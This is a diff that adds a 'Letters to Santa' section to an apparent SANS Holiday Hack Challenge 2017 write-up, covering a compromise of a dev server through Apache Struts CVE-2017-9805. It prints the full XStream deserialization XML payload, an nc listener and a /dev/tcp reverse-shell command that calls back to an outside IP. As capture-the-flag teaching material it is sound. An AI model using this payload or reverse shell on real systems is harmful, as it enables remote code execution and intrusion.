@@ -807,10 +807,75 @@ elf@a9a5df40cd29:~$ LD_PRELOAD="$PWD/hacking_time" ./isit42
 ## Santa Web Attacks
 ---
 
+The Santa Web Attacks are the core of the SANS Holiday Hack Challenge, the structure was quite unknown from the get go, as we were give some basic information about the systems we would be attacking. The idea was you would find things as you progressed that would help you with the next challenge and so on.
+
+**NOTE:** Question 1 was technically covered in the  the introduction levels in the North Pole and Beyond world. The **GreatBookPage1.pdf** was obtained by rolling the snowball over the page. The title of that page was "About This Book..."
+
+**NOTE:** For completeness I'll also mention **GreatBookPage5.pdf** was obtained in `Bumbles Bounce` level by rolling a snowball over the page. The title of that page was "The Abominable Snow Monster"
+
 ### Letters to Santa
 
 **Task:** Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
 
+For this challenge I hit the ground running, I fired up the browser and navigated to http://l2s.northpolechristmastown.com then began attempting some very basic XSS, mainly testing to see if I was allowed to send javascript queries in the Custom Message box.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-wishlist-inject.jpg" />
+
+This was unsuccessful however and I just ended up probably just ended up on Santa's naughty list for assuming he wouldn't have handled input validation appropriately.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-angry-santa.gif" />
+
+I moved onto the source code of the site and came across an interesting comment and code block near the bottom that referred me to a partner domain https://dev.northpolechristmastown.com.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-dev-site.jpg" />
+
+The new dev site that was uncovered was interesting, as it immediately redirected to a sub page at https://dev.northpolechristmastown.com/orders.xhtml
+
+The trail end of this address is promising as is seems to be serving up `xhtml`. Before moving on I also checked the source code of this page and found another interesting comment from the developers.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-struts-exploit-comment.jpg" />
+
+I can smell a struts exploit coming up!
+
+After trying a couple different more [mainstream CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-6117/Apache-Struts.html) like [CVE-2017-5638](https://www.cvedetails.com/cve/CVE-2017-5638/) and [CVE-2016-4461](https://www.cvedetails.com/cve/CVE-2016-4461/) I decided to turn my attention on whether the `xhtml` was exploited in any CVEs.
+
+I came across a [SANS blog post](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code) that detailed the [CVE-2017-9805](https://www.rapid7.com/db/vulnerabilities/struts-cve-2017-9805) exploit and how it could be used to manipulate the Apache Struts 2 REST Plugin XStream RCE into decentralizing specially crafted HTTP requests and achieving remote code execution.
+
+The concept behind this exploit is quite simple, while we can't directly encode a command in the XML structure we can encode it in base64. The REST plugin **decode and execute** our command unwillingly due to no checks on encoded special characters.
+
+The core XML to this exploite can be seen below, where out custom command replaces the `COMMANDWILLGOHERE` field
+
+```python
+xml_exploit =  parseString('<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>/bin/bash</string><string>-c</string><string>COMMANDWILLGOHERE</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>')
+```
+
+The repo available [here](https://github.com/chrisjd20/cve-2017-9805.py/blob/master/cve-2017-9805.py) was the exploit I deceided to go with in order to compromise the system.
+
+I set up a reverse shell listener with `nc` using the following command on my local system on port 9001. This would be the port the remote system would be forced to connect back to me over
+
+```bash
+$ nc -l -p 9001 -vvv
+```
+
+I ran the aforementioned `cve-2017-9805.py` exploit with the following syntax to kick the exploit off, ensuring I pointed it at the https://dev.northpolechristmastown.com/orders.xhtml endpoint.
+
+```bash
+python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "/bin/bash -i > /dev/tcp/203.59.106.231/9001 0<&1 2>&1"
+```
+
+The exploit fired
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-struts-exploit-attack.jpg" />
+
+And the listener suddenly filled up with a script prompt, giving me remote access to a user named `alabaster_snowball`'s session.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-struts-exploit-listener.jpg" />
+
+**References:**
+
+[Why You Need the Skills to Tinker with Publicly Released Exploit Code](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)
+
+[Better Exploit Code For CVE 2017 9805 apache struts](https://github.com/chrisjd20/cve-2017-9805.py)
 
 ### SMB File Server
 
